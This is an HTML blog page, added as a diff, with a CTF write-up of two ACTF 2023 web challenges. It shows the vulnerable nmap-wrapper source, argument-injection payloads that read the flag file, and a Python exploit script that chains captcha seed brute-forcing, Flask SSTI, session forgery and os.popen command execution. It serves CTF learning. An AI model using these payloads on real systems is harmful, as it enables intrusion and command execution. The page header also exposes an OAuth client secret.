@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="jerem1ah">
+    
+    <title>
+        
+            ACTF2023 web部分 |
+        
+        Jerem1ah&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","favicon":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","avatar":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":"Lejeremiah","github_admins":null,"repository":"gitalk","client_id":"a415960e8a19902e98bf","client_secret":"97151a67ce9c95ad3c333c402f4cee0f5f05020f"},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Jerem1ah&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">ACTF2023 web部分</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">jerem1ah</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-11-09 21:40:23</span>
+        <span class="mobile">2023-11-09 21:40</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-11-18 01:25:29</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="ACTF2023-Web部分"><a href="#ACTF2023-Web部分" class="headerlink" title="ACTF2023 Web部分"></a>ACTF2023 Web部分</h1><h1 id="ACTF-2023-MyGO’s-Live"><a href="#ACTF-2023-MyGO’s-Live" class="headerlink" title="[ACTF 2023] MyGO’s Live!!!!!"></a>[ACTF 2023] MyGO’s Live!!!!!</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Inspiration: SekaiCTF scanner service</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3333</span>;</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(__dirname + <span class="string">&#x27;/public/index.html&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Send the HTML content</span></span><br><span class="line">      res.<span class="title function_">send</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escaped</span>(<span class="params">c</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\ &#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\$&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\`&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\&quot;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\|&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\&amp;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\&lt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\(&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\)&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\\&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&quot;*&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\\*&#x27;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/checker&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> url = req.<span class="property">query</span>.<span class="property">url</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (url) &#123;</span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">length</span> &gt; <span class="number">60</span>) &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;我喜欢你&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    url = [...url].<span class="title function_">map</span>(escaped).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> host;</span><br><span class="line">    <span class="keyword">let</span> port;</span><br><span class="line">    <span class="keyword">if</span> (url.<span class="title function_">includes</span>(<span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">const</span> parts = url.<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">      host = parts[<span class="number">0</span>];</span><br><span class="line">      port = parts.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      host = url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> command = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">// console.log(host);</span></span><br><span class="line">    <span class="comment">// console.log(port);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (port) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">isNaN</span>(<span class="built_in">parseInt</span>(port))) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;我喜欢你&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      command = [<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, port, host].<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>); <span class="comment">// Construct the shell command</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      command = [<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="string">&quot;80&quot;</span>, host].<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fdout = fs.<span class="title function_">openSync</span>(<span class="string">&#x27;stdout.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> fderr = fs.<span class="title function_">openSync</span>(<span class="string">&#x27;stderr.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    nmap = <span class="title function_">spawn</span>(<span class="string">&quot;bash&quot;</span>, [<span class="string">&quot;-c&quot;</span>, command], &#123;<span class="attr">stdio</span>: [<span class="number">0</span>,fdout,fderr] &#125; );</span><br><span class="line"></span><br><span class="line">    nmap.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;child process exited with code &#x27;</span> + code.<span class="title function_">toString</span>());</span><br><span class="line">      <span class="keyword">if</span> (code !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;stderr.log&#x27;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error executing command: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Error executing command!!! <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;stdout.log&#x27;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Ok: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;No parameter provided.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Uncaught Exception:&#x27;</span>, err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/37ACTF2023/image-20231031143030937.png" alt="image-20231031143030937"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checker?url=:1%0d-iL%09/flag-????????????????%09-oN%09/dev/stdout</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checker?url=-iL%20/flag%20public/index.html%20127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="ACTF-2023-story"><a href="#ACTF-2023-story" class="headerlink" title="[ACTF 2023] story"></a>[ACTF 2023] story</h1><p><a class="link"   target="_blank" rel="noopener" href="https://su-team.cn/passages/2023-10-28-ACTF/" >https://su-team.cn/passages/2023-10-28-ACTF/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JpCJqwSjQKquua9jwUzmxg" >https://mp.weixin.qq.com/s/JpCJqwSjQKquua9jwUzmxg<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1698/#toc_payload" >https://tttang.com/archive/1698/#toc_payload<i class="fas fa-external-link-alt"></i></a></p>
+<p>说一下整体思路，首先去审计代码，发现seed是基于时间的，即使有个随机数直接爆破就行，这一步在get_seed实现，获得seed之后，去write路由写模板注入，发现有waf，waf的过滤规则有一个随机。我们这里选择读取config配置，进而伪造session，只有rule6可以config，直接爆就完了，这个实现在get_config_secretKey函数，就是为了获取secret_key，之后就是session伪造，没有什么过滤了就，直接ssti打就完了。</p>
+<p>以下是exp，需要在同目录下添加captcha.py和minic.py 还需要把Captcha类初始化时的_key赋值时把随机去掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self, width: int = 160, height: int = 60, key: int = None, length: int = 4, </span><br><span class="line">                 fonts: t.Optional[t.List[str]] = None, font_sizes: t.Optional[t.Tuple[int]] = None):</span><br><span class="line">        self._width = width</span><br><span class="line">        self._height = height</span><br><span class="line">        self._length = length</span><br><span class="line">        # self._key = (key or int(time.time())) + random.randint(1,100)</span><br><span class="line">        self._key = (key or int(time.time()))</span><br><span class="line">        self._fonts = fonts or DEFAULT_FONTS</span><br><span class="line">        self._font_sizes = font_sizes or (42, 50, 56)</span><br><span class="line">        self._truefonts: t.List[FreeTypeFont] = []</span><br><span class="line">        random.seed(self._key)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> captcha <span class="keyword">import</span> Captcha, generate_code</span><br><span class="line"><span class="keyword">from</span> minic <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39.105.51.11:28130&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_seed</span>():</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        session = requests.session()</span><br><span class="line">        now_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        server_code = session.get(url+<span class="string">&quot;/captcha&quot;</span>)</span><br><span class="line">        last_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">        <span class="comment"># print(str(now_time)+&quot;-----now&quot;)</span></span><br><span class="line">        <span class="comment"># print(str(last_time)+&#x27;-----last&#x27;)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">102</span>):</span><br><span class="line">            gen = Captcha(<span class="number">200</span>,<span class="number">80</span>,key=now_time+i)</span><br><span class="line">            buf, captcha_text = gen.generate()</span><br><span class="line">            tmp = buf.getvalue()</span><br><span class="line">            <span class="keyword">if</span>  tmp == server_code.content:</span><br><span class="line">                <span class="built_in">print</span>(now_time+i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;success--------&quot;</span>)</span><br><span class="line">                seed = now_time+i</span><br><span class="line">                <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_config_secretKey</span>():</span><br><span class="line">    payload = &#123;<span class="string">&quot;story&quot;</span>:<span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        code = generate_code()</span><br><span class="line">        res = session.post(url+<span class="string">&#x27;/vip&#x27;</span>,json=&#123;<span class="string">&quot;captcha&quot;</span>:code&#125;)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line"></span><br><span class="line">        minic_waf(<span class="built_in">str</span>(payload))</span><br><span class="line">        res = session.post(url+<span class="string">&#x27;/write&#x27;</span>,json=&#123;<span class="string">&quot;story&quot;</span>:<span class="built_in">str</span>(payload)&#125;).text</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;no way&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = session.get(url+<span class="string">&#x27;/story&#x27;</span>).text</span><br><span class="line">            res = html.unescape(res)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encode</span>():</span><br><span class="line">    <span class="keyword">import</span> ast</span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line">    <span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">            self.secret_key = secret_key</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line">    key = <span class="string">&#x27;secret123123&#x27;</span></span><br><span class="line">    <span class="comment"># &quot;&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;&quot;</span></span><br><span class="line">    session = &#123;</span><br><span class="line">        <span class="string">&quot;story&quot;</span>:<span class="string">&quot;&#123;&#123;config.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls;cat flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    cookie = FSCM.encode(key,<span class="built_in">str</span>(session))</span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br><span class="line">    </span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;/story&#x27;</span>,cookies=&#123;<span class="string">&#x27;session&#x27;</span>:cookie&#125;).text</span><br><span class="line">    res = html.unescape(res)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># seed = get_seed()</span></span><br><span class="line"><span 